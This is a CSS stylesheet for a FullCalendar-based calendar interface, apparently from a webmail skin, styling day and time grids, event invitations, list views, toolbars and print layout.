 .fc-ltr .fc-day-grid-event.fc-allow-mouse-resize .fc-start-resizer,
 .fc-rtl .fc-day-grid-event.fc-allow-mouse-resize .fc-end-resizer {
   margin-left: -2px;
   /* to the day cell's edge */
 }
 /* right resizer */
 .fc-ltr .fc-day-grid-event.fc-allow-mouse-resize .fc-end-resizer,
 .fc-rtl .fc-day-grid-event.fc-allow-mouse-resize .fc-start-resizer {
   margin-right: -2px;
   /* to the day cell's edge */
 }
 /* Event Limiting
 --------------------------------------------------------------------------------------------------*/
 /* "more" link that represents hidden events */
 a.fc-more {
   margin: 1px 3px;
   font-size: 0.85em;
   cursor: pointer;
   text-decoration: none;
 }
 a.fc-more:hover {
   text-decoration: underline;
 }
 .fc-limited {
   /* rows and cells that are hidden because of a "more" link */
   display: none;
 }
 /* popover that appears when "more" link is clicked */
 .fc-day-grid .fc-row {
   z-index: 1;
   /* make the "more" popover one higher than this */
 }
 .fc-more-popover {
   z-index: 2;
   width: 220px;
 }
 .fc-more-popover .fc-event-container {
   padding: 10px;
 }
 /* Now Indicator
 --------------------------------------------------------------------------------------------------*/
 .fc-now-indicator {
   position: absolute;
   border: 0 solid red;
 }
 /* Utilities
 --------------------------------------------------------------------------------------------------*/
 .fc-unselectable {
   -webkit-user-select: none;
   -khtml-user-select: none;
   -moz-user-select: none;
   -ms-user-select: none;
   user-select: none;
   -webkit-touch-callout: none;
   -webkit-tap-highlight-color: transparent;
 }
 /*
 TODO: more distinction between this file and common.css
 */
 /* Colors
 --------------------------------------------------------------------------------------------------*/
 .fc-unthemed th,
 .fc-unthemed td,
 .fc-unthemed thead,
 .fc-unthemed tbody,
 .fc-unthemed .fc-divider,
 .fc-unthemed .fc-row,
 .fc-unthemed .fc-content,
 .fc-unthemed .fc-popover,
 .fc-unthemed .fc-list-view,
 .fc-unthemed .fc-list-heading td {
   border-color: #ddd;
 }
 .fc-unthemed .fc-popover {
   background-color: #fff;
 }
 .fc-unthemed .fc-divider,
 .fc-unthemed .fc-popover .fc-header,
 .fc-unthemed .fc-list-heading td {
   background: #eee;
 }
 .fc-unthemed .fc-popover .fc-header .fc-close {
   color: #666;
 }
 .fc-unthemed td.fc-today {
   background: #fcf8e3;
 }
 .fc-unthemed .fc-disabled-day {
   background: #d7d7d7;
   opacity: 0.3;
 }
 /* Icons (inline elements with styled text that mock arrow icons)
 --------------------------------------------------------------------------------------------------*/
 .fc-icon {
   display: inline-block;
   height: 1em;
   line-height: 1em;
   font-size: 1em;
   text-align: center;
   overflow: hidden;
   font-family: "Courier New", Courier, monospace;
   /* don't allow browser text-selection */
   -webkit-touch-callout: none;
   -webkit-user-select: none;
   -khtml-user-select: none;
   -moz-user-select: none;
   -ms-user-select: none;
   user-select: none;
 }
 /*
 Acceptable font-family overrides for individual icons:
   "Arial", sans-serif
   "Times New Roman", serif
 
 NOTE: use percentage font sizes or else old IE chokes
 */
 .fc-icon:after {
   position: relative;
 }
 .fc-icon-left-single-arrow:after {
   content: "\2039";
   font-weight: bold;
   font-size: 200%;
   top: -7%;
 }
 .fc-icon-right-single-arrow:after {
   content: "\203A";
   font-weight: bold;
   font-size: 200%;
   top: -7%;
 }
 .fc-icon-left-double-arrow:after {
   content: "\AB";
   font-size: 160%;
   top: -7%;
 }
 .fc-icon-right-double-arrow:after {
   content: "\BB";
   font-size: 160%;
   top: -7%;
 }
 .fc-icon-left-triangle:after {
   content: "\25C4";
   font-size: 125%;
   top: 3%;
 }
 .fc-icon-right-triangle:after {
   content: "\25BA";
   font-size: 125%;
   top: 3%;
 }
 .fc-icon-down-triangle:after {
   content: "\25BC";
   font-size: 125%;
   top: 2%;
 }
 .fc-icon-x:after {
   content: "\D7";
   font-size: 200%;
   top: 6%;
 }
 /* Popover
 --------------------------------------------------------------------------------------------------*/
 .fc-unthemed .fc-popover {
   border-width: 1px;
   border-style: solid;
 }
 .fc-unthemed .fc-popover .fc-header .fc-close {
   font-size: 0.9em;
   margin-top: 2px;
 }
 /* List View
 --------------------------------------------------------------------------------------------------*/
 .fc-unthemed .fc-list-item:hover td {
   background-color: #f5f5f5;
 }
 /* Colors
 --------------------------------------------------------------------------------------------------*/
 .ui-widget .fc-disabled-day {
   background-image: none;
 }
 /* Popover
 --------------------------------------------------------------------------------------------------*/
 .fc-popover > .ui-widget-header + .ui-widget-content {
   border-top: 0;
   /* where they meet, let the header have the border */
 }
 /* Global Event Styles
 --------------------------------------------------------------------------------------------------*/
 .ui-widget .fc-event {
   /* overpower jqui's styles on <a> tags. TODO: more DRY */
   color: #fff;
   /* default TEXT color */
   text-decoration: none;
   /* if <a> has an href */
   /* undo ui-widget-header bold */
   font-weight: normal;
 }
 /* TimeGrid axis running down the side (for both the all-day area and the slot area)
 --------------------------------------------------------------------------------------------------*/
 .ui-widget td.fc-axis {
   font-weight: normal;
   /* overcome bold */
 }
 /* TimeGrid Slats (lines that run horizontally)
 --------------------------------------------------------------------------------------------------*/
 .fc-time-grid .fc-slats .ui-widget-content {
   background: none;
   /* see through to fc-bg */
 }
 /* Toolbar
 --------------------------------------------------------------------------------------------------*/
 .fc-toolbar {
   text-align: center;
 }
 .fc-toolbar.fc-header-toolbar {
   margin-bottom: 1em;
 }
 .fc-toolbar.fc-footer-toolbar {
   margin-top: 1em;
 }
 .fc-toolbar .fc-left {
   float: left;
 }
 .fc-toolbar .fc-right {
   float: right;
 }
 .fc-toolbar .fc-center {
   display: inline-block;
 }
 /* the things within each left/right/center section */
 .fc .fc-toolbar > * > * {
   /* extra precedence to override button border margins */
   float: left;
   margin-left: 0.75em;
 }
 /* the first thing within each left/center/right section */
 .fc .fc-toolbar > * > :first-child {
   /* extra precedence to override button border margins */
   margin-left: 0;
 }
 /* title text */
 .fc-toolbar h2 {
   margin: 0;
 }
 /* button layering (for border precedence) */
 .fc-toolbar button {
   position: relative;
 }
 .fc-toolbar .fc-state-hover,
 .fc-toolbar .ui-state-hover {
   z-index: 2;
 }
 .fc-toolbar .fc-state-down {
   z-index: 3;
 }
 .fc-toolbar .fc-state-active,
 .fc-toolbar .ui-state-active {
   z-index: 4;
 }
 .fc-toolbar button:focus {
   z-index: 5;
 }
 /* View Structure
 --------------------------------------------------------------------------------------------------*/
 /* undo twitter bootstrap's box-sizing rules. normalizes positioning techniques */
 /* don't do this for the toolbar because we'll want bootstrap to style those buttons as some pt */
 .fc-view-container *,
 .fc-view-container *:before,
 .fc-view-container *:after {
   -webkit-box-sizing: content-box;
   -moz-box-sizing: content-box;
   box-sizing: content-box;
 }
 .fc-view,
 .fc-view > table {
   /* so dragged elements can be above the view's main element */
   position: relative;
   z-index: 1;
 }
 /* BasicView
 --------------------------------------------------------------------------------------------------*/
 /* day row structure */
 .fc-basicWeek-view .fc-content-skeleton,
 .fc-basicDay-view .fc-content-skeleton {
   /* there may be week numbers in these views, so no padding-top */
   padding-bottom: 1em;
   /* ensure a space at bottom of cell for user selecting/clicking */
 }
 .fc-basic-view .fc-body .fc-row {
   min-height: 4em;
   /* ensure that all rows are at least this tall */
 }
 /* a "rigid" row will take up a constant amount of height because content-skeleton is absolute */
 .fc-row.fc-rigid {
   overflow: hidden;
 }
 .fc-row.fc-rigid .fc-content-skeleton {
   position: absolute;
   top: 0;
   left: 0;
   right: 0;
 }
 /* week and day number styling */
 .fc-day-top.fc-other-month {
   opacity: 0.3;
 }
 .fc-basic-view .fc-week-number,
 .fc-basic-view .fc-day-number {
   padding: 2px;
 }
 .fc-basic-view th.fc-week-number,
 .fc-basic-view th.fc-day-number {
   padding: 0 2px;
   /* column headers can't have as much v space */
 }
 .fc-ltr .fc-basic-view .fc-day-top .fc-day-number {
   float: right;
 }
 .fc-rtl .fc-basic-view .fc-day-top .fc-day-number {
   float: left;
 }
 .fc-ltr .fc-basic-view .fc-day-top .fc-week-number {
   float: left;
   border-radius: 0 0 3px 0;
 }
 .fc-rtl .fc-basic-view .fc-day-top .fc-week-number {
   float: right;
   border-radius: 0 0 0 3px;
 }
 .fc-basic-view .fc-day-top .fc-week-number {
   min-width: 1.5em;
   text-align: center;
   background-color: #f2f2f2;
   color: #808080;
 }
 /* when week/day number have own column */
 .fc-basic-view td.fc-week-number {
   text-align: center;
 }
 .fc-basic-view td.fc-week-number > * {
   /* work around the way we do column resizing and ensure a minimum width */
   display: inline-block;
   min-width: 1.25em;
 }
 /* AgendaView all-day area
 --------------------------------------------------------------------------------------------------*/
 .fc-agenda-view .fc-day-grid {
   position: relative;
   z-index: 2;
   /* so the "more.." popover will be over the time grid */
 }
 .fc-agenda-view .fc-day-grid .fc-row {
   min-height: 3em;
   /* all-day section will never get shorter than this */
 }
 .fc-agenda-view .fc-day-grid .fc-row .fc-content-skeleton {
   padding-bottom: 1em;
   /* give space underneath events for clicking/selecting days */
 }
 /* TimeGrid axis running down the side (for both the all-day area and the slot area)
 --------------------------------------------------------------------------------------------------*/
 .fc .fc-axis {
   /* .fc to overcome default cell styles */
   vertical-align: middle;
   padding: 0 4px;
   white-space: nowrap;
 }
 .fc-ltr .fc-axis {
   text-align: right;
 }
 .fc-rtl .fc-axis {
   text-align: left;
 }
 /* TimeGrid Structure
 --------------------------------------------------------------------------------------------------*/
 .fc-time-grid-container,
 .fc-time-grid {
   /* so slats/bg/content/etc positions get scoped within here */
   position: relative;
   z-index: 1;
 }
 .fc-time-grid {
   min-height: 100%;
   /* so if height setting is 'auto', .fc-bg stretches to fill height */
 }
 .fc-time-grid table {
   /* don't put outer borders on slats/bg/content/etc */
   border: 0 hidden transparent;
 }
 .fc-time-grid > .fc-bg {
   z-index: 1;
 }
 .fc-time-grid .fc-slats,
 .fc-time-grid > hr {
   /* the <hr> AgendaView injects when grid is shorter than scroller */
   position: relative;
   z-index: 2;
 }
 .fc-time-grid .fc-content-col {
   position: relative;
   /* because now-indicator lives directly inside */
 }
 .fc-time-grid .fc-content-skeleton {
   position: absolute;
   z-index: 3;
   top: 0;
   left: 0;
   right: 0;
 }
 /* divs within a cell within the fc-content-skeleton */
 .fc-time-grid .fc-business-container {
   position: relative;
   z-index: 1;
 }
 .fc-time-grid .fc-bgevent-container {
   position: relative;
   z-index: 2;
 }
 .fc-time-grid .fc-highlight-container {
   position: relative;
   z-index: 3;
 }
 .fc-time-grid .fc-event-container {
   position: relative;
   z-index: 4;
 }
 .fc-time-grid .fc-now-indicator-line {
   z-index: 5;
 }
 .fc-time-grid .fc-helper-container {
   /* also is fc-event-container */
   position: relative;
   z-index: 6;
 }
 /* TimeGrid Slats (lines that run horizontally)
 --------------------------------------------------------------------------------------------------*/
 .fc-time-grid .fc-slats td {
   height: 1.5em;
   border-bottom: 0;
   /* each cell is responsible for its top border */
 }
 .fc-time-grid .fc-slats .fc-minor td {
   border-top-style: dotted;
 }
 /* TimeGrid Highlighting Slots
 --------------------------------------------------------------------------------------------------*/
 .fc-time-grid .fc-highlight-container {
   /* a div within a cell within the fc-highlight-skeleton */
   position: relative;
   /* scopes the left/right of the fc-highlight to be in the column */
 }
 .fc-time-grid .fc-highlight {
   position: absolute;
   left: 0;
   right: 0;
   /* top and bottom will be in by JS */
 }
 /* TimeGrid Event Containment
 --------------------------------------------------------------------------------------------------*/
 .fc-ltr .fc-time-grid .fc-event-container {
   /* space on the sides of events for LTR (default) */
   margin: 0 2.5% 0 2px;
 }
 .fc-rtl .fc-time-grid .fc-event-container {
   /* space on the sides of events for RTL */
   margin: 0 2px 0 2.5%;
 }
 .fc-time-grid .fc-event,
 .fc-time-grid .fc-bgevent {
   position: absolute;
   z-index: 1;
   /* scope inner z-index's */
 }
 .fc-time-grid .fc-bgevent {
   /* background events always span full width */
   left: 0;
   right: 0;
 }
 /* Generic Vertical Event
 --------------------------------------------------------------------------------------------------*/
 .fc-v-event.fc-not-start {
   /* events that are continuing from another day */
   /* replace space made by the top border with padding */
   border-top-width: 0;
   padding-top: 1px;
   /* remove top rounded corners */
   border-top-left-radius: 0;
   border-top-right-radius: 0;
 }
 .fc-v-event.fc-not-end {
   /* replace space made by the top border with padding */
   border-bottom-width: 0;
   padding-bottom: 1px;
   /* remove bottom rounded corners */
   border-bottom-left-radius: 0;
   border-bottom-right-radius: 0;
 }
 /* TimeGrid Event Styling
 ----------------------------------------------------------------------------------------------------
 We use the full "fc-time-grid-event" class instead of using descendants because the event won't
 be a descendant of the grid when it is being dragged.
 */
 .fc-time-grid-event {
   overflow: hidden;
   /* don't let the bg flow over rounded corners */
 }
 .fc-time-grid-event.fc-selected {
   /* need to allow touch resizers to extend outside event's bounding box */
   /* common fc-selected styles hide the fc-bg, so don't need this anyway */
   overflow: visible;
 }
 .fc-time-grid-event.fc-selected .fc-bg {
   display: none;
   /* hide semi-white background, to appear darker */
 }
 .fc-time-grid-event .fc-content {
   overflow: hidden;
   /* for when .fc-selected */
 }
 .fc-time-grid-event .fc-time,
 .fc-time-grid-event .fc-title {
   padding: 0 1px;
 }
 .fc-time-grid-event .fc-time {
   font-size: 0.85em;
   white-space: nowrap;
 }
 /* short mode, where time and title are on the same line */
 .fc-time-grid-event.fc-short .fc-content {
   /* don't wrap to second line (now that contents will be inline) */
   white-space: nowrap;
 }
 .fc-time-grid-event.fc-short .fc-time,
 .fc-time-grid-event.fc-short .fc-title {
   /* put the time and title on the same line */
   display: inline-block;
   vertical-align: top;
 }
 .fc-time-grid-event.fc-short .fc-time span {
   display: none;
   /* don't display the full time text... */
 }
 .fc-time-grid-event.fc-short .fc-time:before {
   content: attr(data-start);
   /* ...instead, display only the start time */
 }
 .fc-time-grid-event.fc-short .fc-time:after {
   content: "\A0-\A0";
   /* seperate with a dash, wrapped in nbsp's */
 }
 .fc-time-grid-event.fc-short .fc-title {
   font-size: 0.85em;
   /* make the title text the same size as the time */
   padding: 0;
   /* undo padding from above */
 }
 /* resizer (cursor device) */
 .fc-time-grid-event.fc-allow-mouse-resize .fc-resizer {
   left: 0;
   right: 0;
   bottom: 0;
   height: 8px;
   overflow: hidden;
   line-height: 8px;
   font-size: 11px;
   font-family: monospace;
   text-align: center;
   cursor: s-resize;
 }
 .fc-time-grid-event.fc-allow-mouse-resize .fc-resizer:after {
   content: "=";
 }
 /* resizer (touch device) */
 .fc-time-grid-event.fc-selected .fc-resizer {
   /* 10x10 dot */
   border-radius: 5px;
   border-width: 1px;
   width: 8px;
   height: 8px;
   border-style: solid;
   border-color: inherit;
   background: #fff;
   /* horizontally center */
   left: 50%;
   margin-left: -5px;
   /* center on the bottom edge */
   bottom: -5px;
 }
 /* Now Indicator
 --------------------------------------------------------------------------------------------------*/
 .fc-time-grid .fc-now-indicator-line {
   border-top-width: 1px;
   left: 0;
   right: 0;
 }
 /* arrow on axis */
 .fc-time-grid .fc-now-indicator-arrow {
   margin-top: -5px;
   /* vertically center on top coordinate */
 }
 .fc-ltr .fc-time-grid .fc-now-indicator-arrow {
   left: 0;
   /* triangle pointing right... */
   border-width: 5px 0 5px 6px;
   border-top-color: transparent;
   border-bottom-color: transparent;
 }
 .fc-rtl .fc-time-grid .fc-now-indicator-arrow {
   right: 0;
   /* triangle pointing left... */
   border-width: 5px 6px 5px 0;
   border-top-color: transparent;
   border-bottom-color: transparent;
 }
 /* List View
 --------------------------------------------------------------------------------------------------*/
 /* possibly reusable */
 .fc-event-dot {
   display: inline-block;
   width: 10px;
   height: 10px;
   border-radius: 5px;
 }
 /* view wrapper */
 .fc-rtl .fc-list-view {
   direction: rtl;
   /* unlike core views, leverage browser RTL */
 }
 .fc-list-view {
   border-width: 1px;
   border-style: solid;
 }
 /* table resets */
 .fc .fc-list-table {
   table-layout: auto;
   /* for shrinkwrapping cell content */
 }
 .fc-list-table td {
   border-width: 1px 0 0;
   padding: 8px 14px;
 }
 .fc-list-table tr:first-child td {
   border-top-width: 0;
 }
 /* day headings with the list */
 .fc-list-heading {
   border-bottom-width: 1px;
 }
 .fc-list-heading td {
   font-weight: bold;
 }
 .fc-ltr .fc-list-heading-main {
   float: left;
 }
 .fc-ltr .fc-list-heading-alt {
   float: right;
 }
 .fc-rtl .fc-list-heading-main {
   float: right;
 }
 .fc-rtl .fc-list-heading-alt {
   float: left;
 }
 /* event list items */
 .fc-list-item.fc-has-url {
   cursor: pointer;
   /* whole row will be clickable */
 }
 .fc-list-item-marker,
 .fc-list-item-time {
   white-space: nowrap;
   width: 1px;
 }
 /* make the dot closer to the event title */
 .fc-ltr .fc-list-item-marker {
   padding-right: 0;
 }
 .fc-rtl .fc-list-item-marker {
   padding-left: 0;
 }
 .fc-list-item-title a {
   /* every event title cell has an <a> tag */
   text-decoration: none;
   color: inherit;
 }
 .fc-list-item-title a[href]:hover {
   /* hover effect only on titles with hrefs */
   text-decoration: underline;
 }
 /* message when no events */
 .fc-list-empty-wrap2 {
   position: absolute;
   top: 0;
   left: 0;
   right: 0;
   bottom: 0;
 }
 .fc-list-empty-wrap1 {
   width: 100%;
   height: 100%;
   display: table;
 }
 .fc-list-empty {
   display: table-cell;
   vertical-align: middle;
   text-align: center;
 }
 .fc-unthemed .fc-list-empty {
   /* theme will provide own background */
   background-color: #eee;
 }
 body.quickview-active .fc .fc-scroller {
   background: url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20576%20512%22%3E%3Cpath%20fill%3D%22%23f0f3f4%22%20d%3D%22M569.354%20231.631C512.969%20135.949%20407.81%2072%20288%2072%20168.14%2072%2063.004%20135.994%206.646%20231.631a47.999%2047.999%200%200%200%200%2048.739C63.031%20376.051%20168.19%20440%20288%20440c119.86%200%20224.996-63.994%20281.354-159.631a47.997%2047.997%200%200%200%200-48.738zM288%20392c-75.162%200-136-60.827-136-136%200-75.162%2060.826-136%20136-136%2075.162%200%20136%2060.826%20136%20136%200%2075.162-60.826%20136-136%20136zm104-136c0%2057.438-46.562%20104-104%20104s-104-46.562-104-104c0-17.708%204.431-34.379%2012.236-48.973l-.001.032c0%2023.651%2019.173%2042.823%2042.824%2042.823s42.824-19.173%2042.824-42.823c0-23.651-19.173-42.824-42.824-42.824l-.032.001C253.621%20156.431%20270.292%20152%20288%20152c57.438%200%20104%2046.562%20104%20104z%22%2F%3E%3C%2Fsvg%3E") center no-repeat;
   background-size: 50%;
 }
 .fc .fc-header-toolbar {
   display: flex;
   background-color: #f1f3f4;
   margin: 0;
 }
 .fc .fc-header-toolbar > * > * {
   float: none;
   margin: 0;
 }
 .fc .fc-left {
   order: 1;
 }
 .fc .fc-left .fc-button-group {
   display: none;
 }
 .fc .fc-center {
   flex: 1;
   order: 2;
   text-align: center;
   padding: 0.25rem;
 }
 .fc .fc-center h2 {
   margin: 0;
   color: #737677;
   white-space: nowrap;
   font-size: 1.25rem;
   font-weight: bold;
 }
 .fc .fc-right {
   order: 3;
   text-align: right;
 }
 .fc .fc-right .fc-button {
   display: none;
 }
 .fc button {
   height: unset;
   padding: 0.3rem 0.75rem;
 }
 .fc button.prev:before {
   content: "\f104";
   margin: 0 !important;
   line-height: 1;
 }
 .fc button.next:before {
   content: "\f105";
   margin: 0 !important;
   line-height: 1;
 }
 .fc .btn-group {
   padding: 0.5rem;
   margin: 0;
 }
 .fc .fc-type-freebusy {
   opacity: 0.6;
 }
 .fc .fc-type-freebusy .fc-title {
   position: absolute;
   top: -5000px;
 }
 .fc .fc-type-freebusy td {
   color: #999;
 }
 .fc .fc-event-dot {
   background-color: #c00;
 }
 .fc a.fc-event,
 .fc a.fc-event:hover {
   color: #fff;
 }
 .fc .fc-event {
   font-size: 13px;
   background-color: #c00;
   border-color: #c00;
 }
 .fc .fc-event .fc-title {
   font-weight: bold;
 }
 .fc .fc-event .fc-bg {
   opacity: 0.15;
   margin-top: 1.1rem;
 }
 .fc .fc-event.fc-invitation-needs-action,
 .fc .fc-event.fc-invitation-tentative,
 .fc .fc-event.fc-invitation-declined {
   border: 1px dashed #999;
 }
 .fc .fc-event.fc-event-ns-other.fc-invitation-declined {
   opacity: 0.7;
 }
 .fc .fc-event.fc-event-ns-other.fc-invitation-declined .fc-title {
   text-decoration: line-through;
 }
 .fc .fc-event.fc-invitation-tentative .fc-bg {
   background: url(data:image/gif;base64,R0lGODlhCAAIAPABAOuJAP///yH/C1hNUCBEYXRhWE1QAT8AIfkEBQAAAQAsAAAAAAgACAAAAg4Egmipx+ZaDPCtVPFNBQA7) 0 0 repeat #fff;
 }
 .fc .fc-event.fc-invitation-needs-action .fc-bg {
   background: url(data:image/gif;base64,R0lGODlhCAAIAPABAFdXx////yH/C1hNUCBEYXRhWE1QAT8AIfkEBQAAAQAsAAAAAAgACAAAAg4Egmipx+ZaDPCtVPFNBQA7) 0 0 repeat #fff;
 }
 .fc .fc-event.fc-invitation-declined .fc-bg {
   background: url(data:image/gif;base64,R0lGODlhCAAIAPABAMwAAP///yH/C1hNUCBEYXRhWE1QAT8AIfkEBQAAAQAsAAAAAAgACAAAAg4Egmipx+ZaDPCtVPFNBQA7) 0 0 repeat #fff;
 }
 .fc .fc-list-view tr.fc-invitation-tentative,
 .fc .fc-list-view tr.fc-invitation-declined,
 .fc .fc-list-view tr.fc-invitation-needs-action {
   color: #888;
 }
 .fc .fc-list-view tr.fc-invitation-tentative .fc-event-dot,
 .fc .fc-list-view tr.fc-invitation-declined .fc-event-dot,
 .fc .fc-list-view tr.fc-invitation-needs-action .fc-event-dot {
   background-color: #888;
 }
 .fc .fc-needs-action,
 .fc .fc-declined,
 .fc .cal-event-status-cancelled {
   opacity: 0.6;
 }
 .fc .fc-time i {
   display: inline-block;
   width: 1em;
   height: 1em;
   margin-left: 0.25rem;
 }
 .fc .fc-time i:before {
   font-size: 1em;
   line-height: 1;
   margin-top: 0.1rem;
 }
 .fc .fc-time i.fc-icon-recurring:before {
   content: "\f24d";
   font-weight: 400;
 }
 .fc .fc-time i.fc-icon-alarms:before {
   content: "\f0f3";
 }
 .fc .fc-time i.fc-icon-sensitive:before {
   content: "\f023";
 }
 .fc .fc-event-temp {
   opacity: 0.4;
 }
 .fc .fc-nonbusiness {
   background-color: rgba(115, 118, 119, 0.2);
 }
 .fc .fc-day.fc-today {
   background: rgba(255, 212, 82, 0.2) !important;
 }
 .fc .fc-now-indicator {
   border-color: #41b849;
   border-width: 1.5px;
 }
 .fc .fc-list-item,
 .fc .fc-list-item:hover td {
   background: transparent;
 }
 .fc .fc-list-item td,
 .fc .fc-list-item a {
   cursor: default;
 }
 .fc .fc-list-item-title {
   font-weight: bold;
 }
 .fc .fc-list-table td {
   padding: 0.5rem;
 }
 .fc .fc-list-heading td {
   background: rgba(115, 118, 119, 0.1);
 }
 .fc .fc-list-empty {
   display: none;
 }
 .fc .fc-more {
   color: #0099cc !important;
   white-space: nowrap;
 }
 .fc .fc-axis,
 .fc .fc-day-number,
 .fc .fc-week-number,
 .fc .fc-day-header,
 .fc .fc-week-header {
   color: #737677;
   font-size: 0.95rem;
   padding: 0.15rem !important;
 }
 .fc .fc-week-number {
   text-align: center;
 }
 .fc .fc-popover {
   border-radius: 0.3rem;
 }
 .fc .fc-popover .fc-header {
   color: #737677;
   font-size: 0.95rem;
   font-weight: bold;
 }
 .fc .fc-popover .fc-icon-x::after {
   top: 3px;
 }
 .fc .fc-view.fc-widget-content,
 .fc td.fc-head-container {
   border-left-width: 0;
 }
 .fc .fc-list-view,
 .fc .fc-body > tr > .fc-widget-content,
 .fc .fc-body .fc-bg-sceleton .fc-widget-content,
 .fc .fc-body .fc-bg .fc-widget-content {
   border-bottom-width: 0;
 }
 .print-content .fc .fc-header-toolbar {
   background-color: #fff;
 }
 .print-content .fc .fc-center h2 {
   color: #000;
   padding-bottom: 0.75rem;
   font-size: 1.5rem !important;
 }
 .print-content .fc .fc-day.fc-today {
   background: transparent !important;
 }
 .print-content .fc a.fc-event {
   color: #000;
   background-color: #fff !important;
 }
 .print-content .fc .fc-event-description {
   white-space: pre-wrap;
   font-size: 90%;
 }
 .print-content .fc .fc-event-location {
   width: 20%;
 }
 .print-content .fc .fc-event-row-secondary td {
   border: 0;
   padding-top: 0 !important;
 }
 .print-content .fc .fc-scroller {
   overflow: visible !important;
   height: auto !important;
 }
 .print-content .fc .fc-view.fc-widget-content,
 .print-content .fc td.fc-head-container {
   border-left-width: 1px;
 }
 .print-content .fc .fc-list-view,
 .print-content .fc .fc-agenda-view,
 .print-content .fc .fc-month-view {
   border-bottom: 1px solid #ddd;
 }
 @media screen and (max-width: 768px) {
   .fc .fc-left {
     display: block;
     width: 100%;
     padding: 0;
   }
   .fc .fc-left button {
     flex: 1 1 auto;
     border-radius: 0;
   }
   .fc .fc-left .btn-group {
     padding: 0;
     display: flex;
   }
   .fc .fc-list-table .fc-event-location,
   .fc .fc-center,
   .fc .fc-right {
     display: none;
   }
 }
 @media screen and (min-width: 769px) and (max-width: 920px) {
   .fc .fc-center {
     overflow: hidden;
     text-overflow: ellipsis;
     flex: 1;
   }
   .fc .fc-center h2 {
     font-size: 1rem;
     line-height: 1;
     padding-top: 0.45rem;
   }
   .fc .fc-left .btn,
   .fc .fc-right .btn {
     padding-left: 0.5rem;
     padding-right: 0.5rem;
   }
 }
 html:matches(.ipad,.iphone) .ui-dialog-content:not(.iframe)::-webkit-scrollbar,
 html:matches(.ipad,.iphone) #fish-eye-view::-webkit-scrollbar,
 html:matches(.ipad,.iphone) .fc-scroller::-webkit-scrollbar {
   -webkit-appearance: none;
 }
 html:matches(.ipad,.iphone) .ui-dialog-content:not(.iframe)::-webkit-scrollbar:vertical,
 html:matches(.ipad,.iphone) #fish-eye-view::-webkit-scrollbar:vertical,
 html:matches(.ipad,.iphone) .fc-scroller::-webkit-scrollbar:vertical {
   width: 0.6rem;
 }
 html:matches(.ipad,.iphone) .ui-dialog-content:not(.iframe)::-webkit-scrollbar:horizontal,
 html:matches(.ipad,.iphone) #fish-eye-view::-webkit-scrollbar:horizontal,
 html:matches(.ipad,.iphone) .fc-scroller::-webkit-scrollbar:horizontal {
   height: 0.6rem;
 }
 html:matches(.ipad,.iphone) .ui-dialog-content:not(.iframe)::-webkit-scrollbar-thumb,
 html:matches(.ipad,.iphone) #fish-eye-view::-webkit-scrollbar-thumb,
 html:matches(.ipad,.iphone) .fc-scroller::-webkit-scrollbar-thumb {
   background-color: rgba(0, 0, 0, 0.4);
   border-radius: 0.3rem;
   border: 2px solid #fff;
 }
 body.task-calendar #print-layout #calendar-view-selector {
   float: right;
   padding-top: 0.25rem;
 }
 body.task-calendar #print-layout #calendarlist {
   margin-top: 1rem;
 }
 body.task-calendar #print-layout #calendarlist,
 body.task-calendar #print-layout #calendarlist ul {
   list-style: none;
   padding: 0;
 }
 body.task-calendar #print-layout #calendarlist li {
   display: inline-block;
   white-space: nowrap;
 }
 body.task-calendar #print-layout #calendarlist ul,
 body.task-calendar #print-layout #calendarlist li,
 body.task-calendar #print-layout #calendarlist div {
   float: left;
 }
 body.task-calendar #print-layout #calendarlist div {
   margin-right: 2rem;
 }
 body.task-calendar #print-layout #calendarlist a {
   text-decoration: none;
   cursor: auto;
 }
 body.task-calendar #print-layout #calendarlist input,
 body.task-calendar #print-layout #calendarlist span.actions,
 body.task-calendar #print-layout #calendarlist span.handle {
   display: none;
 }
 @media screen and (min-width: 769px) {
   body.task-calendar #layout-sidebar {
     flex: 2 !important;
     max-width: 400px;
   }
 }
 body.task-calendar .ui-datepicker td {
   width: 12.5%;
 }
 body.task-calendar .ui-datepicker .ui-datepicker-week-col {
   color: #d4dbde;
   text-align: center;
 }
 body.task-calendar .ui-datepicker-inline .ui-datepicker-week-col {
   color: #0099cc;
   cursor: pointer;
 }
 body.task-calendar .ui-datepicker-inline .ui-datepicker-activerange {
   background-color: #0099cc;
 }
 #timezone-display {
   font-size: 0.9rem;
   color: #737677;
 }
 #agendaoptions {
   padding: 0 0.5rem 0.5rem 0.5rem;
   display: flex;
   background-color: #f1f3f4;
 }
 #agendaoptions .input-group {
   padding-right: 0.5rem;
   flex-wrap: nowrap;
 }
 #agendaoptions .input-group:last-child {
   padding-right: 0;
 }
 #agendaoptions select {
   min-width: 7em;
 }
 #agendaoptions .input-group-prepend {
   overflow: hidden;
   margin-bottom: 0;
 }
 #agendaoptions .input-group-prepend span {
   display: block;
   overflow: hidden;
   text-overflow: ellipsis;
 }
 #eventshow {
   margin: 0;
 }
 #eventshow .event-title {
   font-size: 1.5rem;
   font-weight: bold;
 }
 #eventshow .event-location {
   overflow: hidden;
   text-overflow: ellipsis;
   white-space: nowrap;
 }
 #eventshow .event-description {
   margin: 1rem 0;
 }
 #eventshow .event-attendees {
   margin-bottom: 1rem;
 }
 #eventshow .event-attendees .attendee {
   margin-right: 0.25rem;
 }
 #eventshow .event-partstat > span {
   display: flex;
 }
 #eventshow .event-partstat .rsvp-status:before {
   display: inline;
   float: none;
 }
 #eventshow .event-partstat .changersvp {
   cursor: pointer;
   font-size: 1.2rem;
   margin-left: 1em;
 }
 #eventshow .event-partstat .changersvp:before {
   content: "\f14b";
   float: none;
   display: inline;
   line-height: 1;
 }
 #eventshow .event-partstat .inner {
   display: none;
 }
 #eventedit .edit-attendees-table td {
   padding-top: 0.15rem;
 }
 #eventedit .edit-attendees-table td.role {
   padding-left: 0;
   width: 9em;
 }
 #fish-eye-view {
   padding: 0;
 }
 @media screen and (min-width: 769px) {
   #fish-eye-view {
     border-bottom: 1px solid #d4dbde;
   }
 }
 .availability span {
   margin-right: 0.5rem;
   color: #737677;
 }
 .availability span:before {
   content: "\f0c8";
   display: inline;
   float: none;
 }
 .availability span.legend:before {
   font-size: 1em;
 }
 .availability span.loading:before {
   -webkit-animation: spinner-border 1.5s infinite linear;
   animation: spinner-border 1.5s infinite linear;
   content: "\f1ce";
   display: block;
   line-height: 1;
 }
 .availability span.unknown:before {
   color: #bbb;
 }
 .availability span.free:before {
   color: #41b849;
 }
